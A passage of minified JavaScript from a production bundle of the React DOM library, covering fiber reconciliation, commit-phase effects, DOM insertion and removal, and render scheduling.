                    t.lanes = 4194304);
            i.isBackwards ? (o.sibling = t.child,
            t.child = o) : (n = i.last,
            n !== null ? n.sibling = o : t.child = o,
            i.last = o)
        }
        return i.tail !== null ? (t = i.tail,
        i.rendering = t,
        i.tail = t.sibling,
        i.renderingStartTime = ie(),
        t.sibling = null,
        n = ne.current,
        Z(ne, r ? n & 1 | 2 : n & 1),
        t) : (ve(t),
        null);
    case 22:
    case 23:
        return Wo(),
        r = t.memoizedState !== null,
        e !== null && e.memoizedState !== null !== r && (t.flags |= 8192),
        r && t.mode & 1 ? De & 1073741824 && (ve(t),
        t.subtreeFlags & 6 && (t.flags |= 8192)) : ve(t),
        null;
    case 24:
        return null;
    case 25:
        return null
    }
    throw Error(C(156, t.tag))
}
function Dp(e, t) {
    switch (vo(t),
    t.tag) {
    case 1:
        return $e(t.type) && Ar(),
        e = t.flags,
        e & 65536 ? (t.flags = e & -65537 | 128,
        t) : null;
    case 3:
        return Wn(),
        ee(Pe),
        ee(we),
        Co(),
        e = t.flags,
        e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128,
        t) : null;
    case 5:
        return To(t),
        null;
    case 13:
        if (ee(ne),
        e = t.memoizedState,
        e !== null && e.dehydrated !== null) {
            if (t.alternate === null)
                throw Error(C(340));
            Un()
        }
        return e = t.flags,
        e & 65536 ? (t.flags = e & -65537 | 128,
        t) : null;
    case 19:
        return ee(ne),
        null;
    case 4:
        return Wn(),
        null;
    case 10:
        return No(t.type._context),
        null;
    case 22:
    case 23:
        return Wo(),
        null;
    case 24:
        return null;
    default:
        return null
    }
}
var ar = !1
  , Se = !1
  , Rp = typeof WeakSet == "function" ? WeakSet : Set
  , R = null;
function jn(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function")
            try {
                n(null)
            } catch (r) {
                se(e, t, r)
            }
        else
            n.current = null
}
function Ri(e, t, n) {
    try {
        n()
    } catch (r) {
        se(e, t, r)
    }
}
var rc = !1;
function Mp(e, t) {
    if (yi = Cr,
    e = Hu(),
    go(e)) {
        if ("selectionStart"in e)
            var n = {
                start: e.selectionStart,
                end: e.selectionEnd
            };
        else
            e: {
                n = (n = e.ownerDocument) && n.defaultView || window;
                var r = n.getSelection && n.getSelection();
                if (r && r.rangeCount !== 0) {
                    n = r.anchorNode;
                    var s = r.anchorOffset
                      , i = r.focusNode;
                    r = r.focusOffset;
                    try {
                        n.nodeType,
                        i.nodeType
                    } catch {
                        n = null;
                        break e
                    }
                    var o = 0
                      , l = -1
                      , u = -1
                      , c = 0
                      , m = 0
                      , h = e
                      , x = null;
                    t: for (; ; ) {
                        for (var y; h !== n || s !== 0 && h.nodeType !== 3 || (l = o + s),
                        h !== i || r !== 0 && h.nodeType !== 3 || (u = o + r),
                        h.nodeType === 3 && (o += h.nodeValue.length),
                        (y = h.firstChild) !== null; )
                            x = h,
                            h = y;
                        for (; ; ) {
                            if (h === e)
                                break t;
                            if (x === n && ++c === s && (l = o),
                            x === i && ++m === r && (u = o),
                            (y = h.nextSibling) !== null)
                                break;
                            h = x,
                            x = h.parentNode
                        }
                        h = y
                    }
                    n = l === -1 || u === -1 ? null : {
                        start: l,
                        end: u
                    }
                } else
                    n = null
            }
        n = n || {
            start: 0,
            end: 0
        }
    } else
        n = null;
    for (vi = {
        focusedElem: e,
        selectionRange: n
    },
    Cr = !1,
    R = t; R !== null; )
        if (t = R,
        e = t.child,
        (t.subtreeFlags & 1028) !== 0 && e !== null)
            e.return = t,
            R = e;
        else
            for (; R !== null; ) {
                t = R;
                try {
                    var v = t.alternate;
                    if (t.flags & 1024)
                        switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (v !== null) {
                                var k = v.memoizedProps
                                  , p = v.memoizedState
                                  , f = t.stateNode
                                  , d = f.getSnapshotBeforeUpdate(t.elementType === t.type ? k : Je(t.type, k), p);
                                f.__reactInternalSnapshotBeforeUpdate = d
                            }
                            break;
                        case 3:
                            var g = t.stateNode.containerInfo;
                            g.nodeType === 1 ? g.textContent = "" : g.nodeType === 9 && g.documentElement && g.removeChild(g.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(C(163))
                        }
                } catch (S) {
                    se(t, t.return, S)
                }
                if (e = t.sibling,
                e !== null) {
                    e.return = t.return,
                    R = e;
                    break
                }
                R = t.return
            }
    return v = rc,
    rc = !1,
    v
}
function ha(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null,
    r !== null) {
        var s = r = r.next;
        do {
            if ((s.tag & e) === e) {
                var i = s.destroy;
                s.destroy = void 0,
                i !== void 0 && Ri(t, n, i)
            }
            s = s.next
        } while (s !== r)
    }
}
function os(e, t) {
    if (t = t.updateQueue,
    t = t !== null ? t.lastEffect : null,
    t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}
function Mi(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
        case 5:
            e = n;
            break;
        default:
            e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}
function Fd(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null,
    Fd(t)),
    e.child = null,
    e.deletions = null,
    e.sibling = null,
    e.tag === 5 && (t = e.stateNode,
    t !== null && (delete t[ot],
    delete t[Ca],
    delete t[bi],
    delete t[yp],
    delete t[vp])),
    e.stateNode = null,
    e.return = null,
    e.dependencies = null,
    e.memoizedProps = null,
    e.memoizedState = null,
    e.pendingProps = null,
    e.stateNode = null,
    e.updateQueue = null
}
function Kd(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}
function sc(e) {
    e: for (; ; ) {
        for (; e.sibling === null; ) {
            if (e.return === null || Kd(e.return))
                return null;
            e = e.return
        }
        for (e.sibling.return = e.return,
        e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18; ) {
            if (e.flags & 2 || e.child === null || e.tag === 4)
                continue e;
            e.child.return = e,
            e = e.child
        }
        if (!(e.flags & 2))
            return e.stateNode
    }
}
function Ui(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        e = e.stateNode,
        t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode,
        t.insertBefore(e, n)) : (t = n,
        t.appendChild(e)),
        n = n._reactRootContainer,
        n != null || t.onclick !== null || (t.onclick = Er));
    else if (r !== 4 && (e = e.child,
    e !== null))
        for (Ui(e, t, n),
        e = e.sibling; e !== null; )
            Ui(e, t, n),
            e = e.sibling
}
function zi(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        e = e.stateNode,
        t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && (e = e.child,
    e !== null))
        for (zi(e, t, n),
        e = e.sibling; e !== null; )
            zi(e, t, n),
            e = e.sibling
}
var he = null
  , Qe = !1;
function Nt(e, t, n) {
    for (n = n.child; n !== null; )
        _d(e, t, n),
        n = n.sibling
}
function _d(e, t, n) {
    if (ct && typeof ct.onCommitFiberUnmount == "function")
        try {
            ct.onCommitFiberUnmount(Xr, n)
        } catch {}
    switch (n.tag) {
    case 5:
        Se || jn(n, t);
    case 6:
        var r = he
          , s = Qe;
        he = null,
        Nt(e, t, n),
        he = r,
        Qe = s,
        he !== null && (Qe ? (e = he,
        n = n.stateNode,
        e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n)) : he.removeChild(n.stateNode));
        break;
    case 18:
        he !== null && (Qe ? (e = he,
        n = n.stateNode,
        e.nodeType === 8 ? Ms(e.parentNode, n) : e.nodeType === 1 && Ms(e, n),
        Na(e)) : Ms(he, n.stateNode));
        break;
    case 4:
        r = he,
        s = Qe,
        he = n.stateNode.containerInfo,
        Qe = !0,
        Nt(e, t, n),
        he = r,
        Qe = s;
        break;
    case 0:
    case 11:
    case 14:
    case 15:
        if (!Se && (r = n.updateQueue,
        r !== null && (r = r.lastEffect,
        r !== null))) {
            s = r = r.next;
            do {
                var i = s
                  , o = i.destroy;
                i = i.tag,
                o !== void 0 && (i & 2 || i & 4) && Ri(n, t, o),
                s = s.next
            } while (s !== r)
        }
        Nt(e, t, n);
        break;
    case 1:
        if (!Se && (jn(n, t),
        r = n.stateNode,
        typeof r.componentWillUnmount == "function"))
            try {
                r.props = n.memoizedProps,
                r.state = n.memoizedState,
                r.componentWillUnmount()
            } catch (l) {
                se(n, t, l)
            }
        Nt(e, t, n);
        break;
    case 21:
        Nt(e, t, n);
        break;
    case 22:
        n.mode & 1 ? (Se = (r = Se) || n.memoizedState !== null,
        Nt(e, t, n),
        Se = r) : Nt(e, t, n);
        break;
    default:
        Nt(e, t, n)
    }
}
function ic(e) {
    var t = e.updateQueue;
    if (t !== null) {
        e.updateQueue = null;
        var n = e.stateNode;
        n === null && (n = e.stateNode = new Rp),
        t.forEach(function(r) {
            var s = Vp.bind(null, e, r);
            n.has(r) || (n.add(r),
            r.then(s, s))
        })
    }
}
function Ye(e, t) {
    var n = t.deletions;
    if (n !== null)
        for (var r = 0; r < n.length; r++) {
            var s = n[r];
            try {
                var i = e
                  , o = t
                  , l = o;
                e: for (; l !== null; ) {
                    switch (l.tag) {
                    case 5:
                        he = l.stateNode,
                        Qe = !1;
                        break e;
                    case 3:
                        he = l.stateNode.containerInfo,
                        Qe = !0;
                        break e;
                    case 4:
                        he = l.stateNode.containerInfo,
                        Qe = !0;
                        break e
                    }
                    l = l.return
                }
                if (he === null)
                    throw Error(C(160));
                _d(i, o, s),
                he = null,
                Qe = !1;
                var u = s.alternate;
                u !== null && (u.return = null),
                s.return = null
            } catch (c) {
                se(s, t, c)
            }
        }
    if (t.subtreeFlags & 12854)
        for (t = t.child; t !== null; )
            Vd(t, e),
            t = t.sibling
}
function Vd(e, t) {
    var n = e.alternate
      , r = e.flags;
    switch (e.tag) {
    case 0:
    case 11:
    case 14:
    case 15:
        if (Ye(t, e),
        st(e),
        r & 4) {
            try {
                ha(3, e, e.return),
                os(3, e)
            } catch (k) {
                se(e, e.return, k)
            }
            try {
                ha(5, e, e.return)
            } catch (k) {
                se(e, e.return, k)
            }
        }
        break;
    case 1:
        Ye(t, e),
        st(e),
        r & 512 && n !== null && jn(n, n.return);
        break;
    case 5:
        if (Ye(t, e),
        st(e),
        r & 512 && n !== null && jn(n, n.return),
        e.flags & 32) {
            var s = e.stateNode;
            try {
                va(s, "")
            } catch (k) {
                se(e, e.return, k)
            }
        }
        if (r & 4 && (s = e.stateNode,
        s != null)) {
            var i = e.memoizedProps
              , o = n !== null ? n.memoizedProps : i
              , l = e.type
              , u = e.updateQueue;
            if (e.updateQueue = null,
            u !== null)
                try {
                    l === "input" && i.type === "radio" && i.name != null && hu(s, i),
                    li(l, o);
                    var c = li(l, i);
                    for (o = 0; o < u.length; o += 2) {
                        var m = u[o]
                          , h = u[o + 1];
                        m === "style" ? yu(s, h) : m === "dangerouslySetInnerHTML" ? xu(s, h) : m === "children" ? va(s, h) : ao(s, m, h, c)
                    }
                    switch (l) {
                    case "input":
                        ai(s, i);
                        break;
                    case "textarea":
                        pu(s, i);
                        break;
                    case "select":
                        var x = s._wrapperState.wasMultiple;
                        s._wrapperState.wasMultiple = !!i.multiple;
                        var y = i.value;
                        y != null ? Cn(s, !!i.multiple, y, !1) : x !== !!i.multiple && (i.defaultValue != null ? Cn(s, !!i.multiple, i.defaultValue, !0) : Cn(s, !!i.multiple, i.multiple ? [] : "", !1))
                    }
                    s[Ca] = i
                } catch (k) {
                    se(e, e.return, k)
                }
        }
        break;
    case 6:
        if (Ye(t, e),
        st(e),
        r & 4) {
            if (e.stateNode === null)
                throw Error(C(162));
            s = e.stateNode,
            i = e.memoizedProps;
            try {
                s.nodeValue = i
            } catch (k) {
                se(e, e.return, k)
            }
        }
        break;
    case 3:
        if (Ye(t, e),
        st(e),
        r & 4 && n !== null && n.memoizedState.isDehydrated)
            try {
                Na(t.containerInfo)
            } catch (k) {
                se(e, e.return, k)
            }
        break;
    case 4:
        Ye(t, e),
        st(e);
        break;
    case 13:
        Ye(t, e),
        st(e),
        s = e.child,
        s.flags & 8192 && (i = s.memoizedState !== null,
        s.stateNode.isHidden = i,
        !i || s.alternate !== null && s.alternate.memoizedState !== null || (Uo = ie())),
        r & 4 && ic(e);
        break;
    case 22:
        if (m = n !== null && n.memoizedState !== null,
        e.mode & 1 ? (Se = (c = Se) || m,
        Ye(t, e),
        Se = c) : Ye(t, e),
        st(e),
        r & 8192) {
            if (c = e.memoizedState !== null,
            (e.stateNode.isHidden = c) && !m && e.mode & 1)
                for (R = e,
                m = e.child; m !== null; ) {
                    for (h = R = m; R !== null; ) {
                        switch (x = R,
                        y = x.child,
                        x.tag) {
                        case 0:
                        case 11:
                        case 14:
                        case 15:
                            ha(4, x, x.return);
                            break;
                        case 1:
                            jn(x, x.return);
                            var v = x.stateNode;
                            if (typeof v.componentWillUnmount == "function") {
                                r = x,
                                n = x.return;
                                try {
                                    t = r,
                                    v.props = t.memoizedProps,
                                    v.state = t.memoizedState,
                                    v.componentWillUnmount()
                                } catch (k) {
                                    se(r, n, k)
                                }
                            }
                            break;
                        case 5:
                            jn(x, x.return);
                            break;
                        case 22:
                            if (x.memoizedState !== null) {
                                lc(h);
                                continue
                            }
                        }
                        y !== null ? (y.return = x,
                        R = y) : lc(h)
                    }
                    m = m.sibling
                }
            e: for (m = null,
            h = e; ; ) {
                if (h.tag === 5) {
                    if (m === null) {
                        m = h;
                        try {
                            s = h.stateNode,
                            c ? (i = s.style,
                            typeof i.setProperty == "function" ? i.setProperty("display", "none", "important") : i.display = "none") : (l = h.stateNode,
                            u = h.memoizedProps.style,
                            o = u != null && u.hasOwnProperty("display") ? u.display : null,
                            l.style.display = gu("display", o))
                        } catch (k) {
                            se(e, e.return, k)
                        }
                    }
                } else if (h.tag === 6) {
                    if (m === null)
                        try {
                            h.stateNode.nodeValue = c ? "" : h.memoizedProps
                        } catch (k) {
                            se(e, e.return, k)
                        }
                } else if ((h.tag !== 22 && h.tag !== 23 || h.memoizedState === null || h === e) && h.child !== null) {
                    h.child.return = h,
                    h = h.child;
                    continue
                }
                if (h === e)
                    break e;
                for (; h.sibling === null; ) {
                    if (h.return === null || h.return === e)
                        break e;
                    m === h && (m = null),
                    h = h.return
                }
                m === h && (m = null),
                h.sibling.return = h.return,
                h = h.sibling
            }
        }
        break;
    case 19:
        Ye(t, e),
        st(e),
        r & 4 && ic(e);
        break;
    case 21:
        break;
    default:
        Ye(t, e),
        st(e)
    }
}
function st(e) {
    var t = e.flags;
    if (t & 2) {
        try {
            e: {
                for (var n = e.return; n !== null; ) {
                    if (Kd(n)) {
                        var r = n;
                        break e
                    }
                    n = n.return
                }
                throw Error(C(160))
            }
            switch (r.tag) {
            case 5:
                var s = r.stateNode;
                r.flags & 32 && (va(s, ""),
                r.flags &= -33);
                var i = sc(e);
                zi(e, i, s);
                break;
            case 3:
            case 4:
                var o = r.stateNode.containerInfo
                  , l = sc(e);
                Ui(e, l, o);
                break;
            default:
                throw Error(C(161))
            }
        } catch (u) {
            se(e, e.return, u)
        }
        e.flags &= -3
    }
    t & 4096 && (e.flags &= -4097)
}
function Up(e, t, n) {
    R = e,
    Hd(e)
}
function Hd(e, t, n) {
    for (var r = (e.mode & 1) !== 0; R !== null; ) {
        var s = R
          , i = s.child;
        if (s.tag === 22 && r) {
            var o = s.memoizedState !== null || ar;
            if (!o) {
                var l = s.alternate
                  , u = l !== null && l.memoizedState !== null || Se;
                l = ar;
                var c = Se;
                if (ar = o,
                (Se = u) && !c)
                    for (R = s; R !== null; )
                        o = R,
                        u = o.child,
                        o.tag === 22 && o.memoizedState !== null ? cc(s) : u !== null ? (u.return = o,
                        R = u) : cc(s);
                for (; i !== null; )
                    R = i,
                    Hd(i),
                    i = i.sibling;
                R = s,
                ar = l,
                Se = c
            }
            oc(e)
        } else
            s.subtreeFlags & 8772 && i !== null ? (i.return = s,
            R = i) : oc(e)
    }
}
function oc(e) {
    for (; R !== null; ) {
        var t = R;
        if (t.flags & 8772) {
            var n = t.alternate;
            try {
                if (t.flags & 8772)
                    switch (t.tag) {
                    case 0:
                    case 11:
                    case 15:
                        Se || os(5, t);
                        break;
                    case 1:
                        var r = t.stateNode;
                        if (t.flags & 4 && !Se)
                            if (n === null)
                                r.componentDidMount();
                            else {
                                var s = t.elementType === t.type ? n.memoizedProps : Je(t.type, n.memoizedProps);
                                r.componentDidUpdate(s, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate)
                            }
                        var i = t.updateQueue;
                        i !== null && Vl(t, i, r);
                        break;
                    case 3:
                        var o = t.updateQueue;
                        if (o !== null) {
                            if (n = null,
                            t.child !== null)
                                switch (t.child.tag) {
                                case 5:
                                    n = t.child.stateNode;
                                    break;
                                case 1:
                                    n = t.child.stateNode
                                }
                            Vl(t, o, n)
                        }
                        break;
                    case 5:
                        var l = t.stateNode;
                        if (n === null && t.flags & 4) {
                            n = l;
                            var u = t.memoizedProps;
                            switch (t.type) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                u.autoFocus && n.focus();
                                break;
                            case "img":
                                u.src && (n.src = u.src)
                            }
                        }
                        break;
                    case 6:
                        break;
                    case 4:
                        break;
                    case 12:
                        break;
                    case 13:
                        if (t.memoizedState === null) {
                            var c = t.alternate;
                            if (c !== null) {
                                var m = c.memoizedState;
                                if (m !== null) {
                                    var h = m.dehydrated;
                                    h !== null && Na(h)
                                }
                            }
                        }
                        break;
                    case 19:
                    case 17:
                    case 21:
                    case 22:
                    case 23:
                    case 25:
                        break;
                    default:
                        throw Error(C(163))
                    }
                Se || t.flags & 512 && Mi(t)
            } catch (x) {
                se(t, t.return, x)
            }
        }
        if (t === e) {
            R = null;
            break
        }
        if (n = t.sibling,
        n !== null) {
            n.return = t.return,
            R = n;
            break
        }
        R = t.return
    }
}
function lc(e) {
    for (; R !== null; ) {
        var t = R;
        if (t === e) {
            R = null;
            break
        }
        var n = t.sibling;
        if (n !== null) {
            n.return = t.return,
            R = n;
            break
        }
        R = t.return
    }
}
function cc(e) {
    for (; R !== null; ) {
        var t = R;
        try {
            switch (t.tag) {
            case 0:
            case 11:
            case 15:
                var n = t.return;
                try {
                    os(4, t)
                } catch (u) {
                    se(t, n, u)
                }
                break;
            case 1:
                var r = t.stateNode;
                if (typeof r.componentDidMount == "function") {
                    var s = t.return;
                    try {
                        r.componentDidMount()
                    } catch (u) {
                        se(t, s, u)
                    }
                }
                var i = t.return;
                try {
                    Mi(t)
                } catch (u) {
                    se(t, i, u)
                }
                break;
            case 5:
                var o = t.return;
                try {
                    Mi(t)
                } catch (u) {
                    se(t, o, u)
                }
            }
        } catch (u) {
            se(t, t.return, u)
        }
        if (t === e) {
            R = null;
            break
        }
        var l = t.sibling;
        if (l !== null) {
            l.return = t.return,
            R = l;
            break
        }
        R = t.return
    }
}
var zp = Math.ceil
  , Fr = bt.ReactCurrentDispatcher
  , Ro = bt.ReactCurrentOwner
  , He = bt.ReactCurrentBatchConfig
  , q = 0
  , me = null
  , oe = null
  , pe = 0
  , De = 0
  , Bn = Kt(0)
  , ue = 0
  , Da = null
  , rn = 0
  , ls = 0
  , Mo = 0
  , pa = null
  , Te = null
  , Uo = 0
  , On = 1 / 0
  , mt = null
  , Kr = !1
  , Wi = null
  , Mt = null
  , rr = !1
  , $t = null
  , _r = 0
  , fa = 0
  , Li = null
  , yr = -1
  , vr = 0;
function ke() {
    return q & 6 ? ie() : yr !== -1 ? yr : yr = ie()
}
function Ut(e) {
    return e.mode & 1 ? q & 2 && pe !== 0 ? pe & -pe : wp.transition !== null ? (vr === 0 && (vr = $u()),
    vr) : (e = Y,
    e !== 0 || (e = window.event,
    e = e === void 0 ? 16 : Uu(e.type)),
    e) : 1
}
function et(e, t, n, r) {
    if (50 < fa)
        throw fa = 0,
        Li = null,
        Error(C(185));
    Wa(e, n, r),
    (!(q & 2) || e !== me) && (e === me && (!(q & 2) && (ls |= n),
    ue === 4 && Ct(e, pe)),
    Ee(e, r),
    n === 1 && q === 0 && !(t.mode & 1) && (On = ie() + 500,
    rs && _t()))
}
function Ee(e, t) {
    var n = e.callbackNode;
    wh(e, t);
    var r = Tr(e, e === me ? pe : 0);
    if (r === 0)
        n !== null && yl(n),
        e.callbackNode = null,
        e.callbackPriority = 0;
    else if (t = r & -r,
    e.callbackPriority !== t) {
        if (n != null && yl(n),
        t === 1)
            e.tag === 0 ? Sp(uc.bind(null, e)) : nd(uc.bind(null, e)),
            xp(function() {
                !(q & 6) && _t()
            }),
            n = null;
        else {
            switch (Eu(r)) {
            case 1:
                n = lo;
                break;
            case 4:
                n = Cu;
                break;
            case 16:
                n = Br;
                break;
            case 536870912:
                n = Pu;
                break;
            default:
                n = Br
            }
            n = em(n, Gd.bind(null, e))
        }
        e.callbackPriority = t,
        e.callbackNode = n
    }
}
function Gd(e, t) {
    if (yr = -1,
    vr = 0,
    q & 6)
        throw Error(C(327));
    var n = e.callbackNode;
    if (In() && e.callbackNode !== n)
        return null;
    var r = Tr(e, e === me ? pe : 0);
    if (r === 0)
        return null;
    if (r & 30 || r & e.expiredLanes || t)
        t = Vr(e, r);
    else {
        t = r;
        var s = q;
        q |= 2;
        var i = Yd();
        (me !== e || pe !== t) && (mt = null,
        On = ie() + 500,
        Zt(e, t));
        do
            try {
                Op();
                break
            } catch (l) {
                qd(e, l)
            }
        while (!0);
        bo(),
        Fr.current = i,
        q = s,
        oe !== null ? t = 0 : (me = null,
        pe = 0,
        t = ue)
    }
    if (t !== 0) {
        if (t === 2 && (s = hi(e),
        s !== 0 && (r = s,
        t = Oi(e, s))),
        t === 1)
            throw n = Da,
            Zt(e, 0),
            Ct(e, r),
            Ee(e, ie()),
            n;
        if (t === 6)
            Ct(e, r);
        else {
            if (s = e.current.alternate,
            !(r & 30) && !Wp(s) && (t = Vr(e, r),
            t === 2 && (i = hi(e),
            i !== 0 && (r = i,
            t = Oi(e, i))),
            t === 1))
                throw n = Da,
                Zt(e, 0),
                Ct(e, r),
                Ee(e, ie()),
                n;
            switch (e.finishedWork = s,
            e.finishedLanes = r,
            t) {
            case 0:
            case 1:
                throw Error(C(345));
            case 2:
                Gt(e, Te, mt);
                break;
            case 3:
                if (Ct(e, r),
                (r & 130023424) === r && (t = Uo + 500 - ie(),
                10 < t)) {
                    if (Tr(e, 0) !== 0)
                        break;
                    if (s = e.suspendedLanes,
                    (s & r) !== r) {
                        ke(),
                        e.pingedLanes |= e.suspendedLanes & s;
                        break
                    }
                    e.timeoutHandle = wi(Gt.bind(null, e, Te, mt), t);
                    break
                }
                Gt(e, Te, mt);
                break;
            case 4:
                if (Ct(e, r),
                (r & 4194240) === r)
                    break;
                for (t = e.eventTimes,
                s = -1; 0 < r; ) {
                    var o = 31 - Xe(r);
                    i = 1 << o,
                    o = t[o],
                    o > s && (s = o),
                    r &= ~i
                }
                if (r = s,
                r = ie() - r,
                r = (120 > r ? 120 : 480 > r ? 480 : 1080 > r ? 1080 : 1920 > r ? 1920 : 3e3 > r ? 3e3 : 4320 > r ? 4320 : 1960 * zp(r / 1960)) - r,
                10 < r) {
                    e.timeoutHandle = wi(Gt.bind(null, e, Te, mt), r);
                    break
                }
                Gt(e, Te, mt);
                break;
            case 5:
                Gt(e, Te, mt);
                break;
            default:
                throw Error(C(329))
            }
        }
    }
    return Ee(e, ie()),
    e.callbackNode === n ? Gd.bind(null, e) : null
}
function Oi(e, t) {
    var n = pa;
    return e.current.memoizedState.isDehydrated && (Zt(e, t).flags |= 256),
    e = Vr(e, t),
    e !== 2 && (t = Te,
    Te = n,
    t !== null && Fi(t)),
    e
}
function Fi(e) {
    Te === null ? Te = e : Te.push.apply(Te, e)
}
function Wp(e) {
    for (var t = e; ; ) {
        if (t.flags & 16384) {
            var n = t.updateQueue;
            if (n !== null && (n = n.stores,
            n !== null))
                for (var r = 0; r < n.length; r++) {
                    var s = n[r]
                      , i = s.getSnapshot;
                    s = s.value;
                    try {
                        if (!nt(i(), s))
                            return !1
                    } catch {
                        return !1
                    }
                }
        }
        if (n = t.child,
        t.subtreeFlags & 16384 && n !== null)
            n.return = t,
            t = n;
        else {
            if (t === e)
                break;
            for (; t.sibling === null; ) {
                if (t.return === null || t.return === e)
                    return !0;
                t = t.return
            }
            t.sibling.return = t.return,
            t = t.sibling
        }
    }
    return !0
}
function Ct(e, t) {
    for (t &= ~Mo,
    t &= ~ls,
    e.suspendedLanes |= t,
    e.pingedLanes &= ~t,
    e = e.expirationTimes; 0 < t; ) {
        var n = 31 - Xe(t)
          , r = 1 << n;
        e[n] = -1,
        t &= ~r
    }
}
function uc(e) {
    if (q & 6)
        throw Error(C(327));
    In();
    var t = Tr(e, 0);
    if (!(t & 1))
        return Ee(e, ie()),
        null;
    var n = Vr(e, t);
    if (e.tag !== 0 && n === 2) {
        var r = hi(e);
        r !== 0 && (t = r,
        n = Oi(e, r))
    }
    if (n === 1)
        throw n = Da,
        Zt(e, 0),
        Ct(e, t),
        Ee(e, ie()),
        n;
    if (n === 6)
        throw Error(C(345));
    return e.finishedWork = e.current.alternate,
    e.finishedLanes = t,
    Gt(e, Te, mt),
    Ee(e, ie()),
    null
}
function zo(e, t) {
    var n = q;
    q |= 1;
    try {
        return e(t)
    } finally {
        q = n,
        q === 0 && (On = ie() + 500,
        rs && _t())
    }
}
function sn(e) {
    $t !== null && $t.tag === 0 && !(q & 6) && In();
    var t = q;
    q |= 1;
    var n = He.transition
      , r = Y;
    try {
        if (He.transition = null,
        Y = 1,
        e)
            return e()
    } finally {
        Y = r,
        He.transition = n,
        q = t,
        !(q & 6) && _t()
    }
}
function Wo() {
    De = Bn.current,
    ee(Bn)
}
function Zt(e, t) {
    e.finishedWork = null,
    e.finishedLanes = 0;
    var n = e.timeoutHandle;
    if (n !== -1 && (e.timeoutHandle = -1,
    fp(n)),
    oe !== null)
        for (n = oe.return; n !== null; ) {
            var r = n;
            switch (vo(r),
            r.tag) {
            case 1:
                r = r.type.childContextTypes,
                r != null && Ar();
                break;
            case 3:
                Wn(),
                ee(Pe),
                ee(we),
                Co();
                break;
            case 5:
                To(r);
                break;
            case 4:
                Wn();
                break;
            case 13:
                ee(ne);
                break;
            case 19:
                ee(ne);
                break;
            case 10:
                No(r.type._context);
                break;
            case 22:
            case 23:
                Wo()
            }
            n = n.return
        }
    if (me = e,
    oe = e = zt(e.current, null),
    pe = De = t,
    ue = 0,
    Da = null,
    Mo = ls = rn = 0,
    Te = pa = null,
    Yt !== null) {
        for (t = 0; t < Yt.length; t++)
            if (n = Yt[t],
            r = n.interleaved,
            r !== null) {
                n.interleaved = null;
                var s = r.next
                  , i = n.pending;
                if (i !== null) {
                    var o = i.next;
                    i.next = s,
                    r.next = o
                }
                n.pending = r
            }
        Yt = null
    }
    return e
}
function qd(e, t) {
    do {
        var n = oe;
        try {
            if (bo(),
            fr.current = Or,
            Lr) {
                for (var r = ae.memoizedState; r !== null; ) {
                    var s = r.queue;
                    s !== null && (s.pending = null),
                    r = r.next
                }
                Lr = !1
            }
            if (an = 0,
            de = ce = ae = null,
            ma = !1,
            Ea = 0,
            Ro.current = null,
            n === null || n.return === null) {
                ue = 1,
                Da = t,
                oe = null;
                break
            }
            e: {
                var i = e
                  , o = n.return
                  , l = n
                  , u = t;
                if (t = pe,
                l.flags |= 32768,
                u !== null && typeof u == "object" && typeof u.then == "function") {
                    var c = u
                      , m = l
                      , h = m.tag;
                    if (!(m.mode & 1) && (h === 0 || h === 11 || h === 15)) {
                        var x = m.alternate;
                        x ? (m.updateQueue = x.updateQueue,
                        m.memoizedState = x.memoizedState,
                        m.lanes = x.lanes) : (m.updateQueue = null,
                        m.memoizedState = null)
                    }
                    var y = Ql(o);
                    if (y !== null) {
                        y.flags &= -257,
                        Zl(y, o, l, i, t),
                        y.mode & 1 && Jl(i, c, t),
                        t = y,
                        u = c;
                        var v = t.updateQueue;
                        if (v === null) {
                            var k = new Set;
                            k.add(u),
                            t.updateQueue = k
                        } else
                            v.add(u);
                        break e
                    } else {
                        if (!(t & 1)) {
                            Jl(i, c, t),
                            Lo();
                            break e
                        }
                        u = Error(C(426))
                    }
                } else if (te && l.mode & 1) {
                    var p = Ql(o);
                    if (p !== null) {
                        !(p.flags & 65536) && (p.flags |= 256),
                        Zl(p, o, l, i, t),
                        So(Ln(u, l));
                        break e
                    }
                }
                i = u = Ln(u, l),
                ue !== 4 && (ue = 2),
                pa === null ? pa = [i] : pa.push(i),
                i = o;
                do {
                    switch (i.tag) {
                    case 3:
                        i.flags |= 65536,
                        t &= -t,
                        i.lanes |= t;
                        var f = Ed(i, u, t);
                        _l(i, f);
                        break e;
                    case 1:
                        l = u;
                        var d = i.type
                          , g = i.stateNode;
                        if (!(i.flags & 128) && (typeof d.getDerivedStateFromError == "function" || g !== null && typeof g.componentDidCatch == "function" && (Mt === null || !Mt.has(g)))) {
                            i.flags |= 65536,
                            t &= -t,
                            i.lanes |= t;
                            var S = Ad(i, l, t);
                            _l(i, S);
                            break e
                        }
                    }
                    i = i.return
                } while (i !== null)
            }
            Qd(n)
        } catch (w) {
            t = w,
            oe === n && n !== null && (oe = n = n.return);
            continue
        }
        break
    } while (!0)
}
function Yd() {
    var e = Fr.current;
    return Fr.current = Or,
    e === null ? Or : e
}
function Lo() {
    (ue === 0 || ue === 3 || ue === 2) && (ue = 4),
    me === null || !(rn & 268435455) && !(ls & 268435455) || Ct(me, pe)
}
function Vr(e, t) {
    var n = q;
    q |= 2;
    var r = Yd();
    (me !== e || pe !== t) && (mt = null,
    Zt(e, t));
    do
        try {
            Lp();
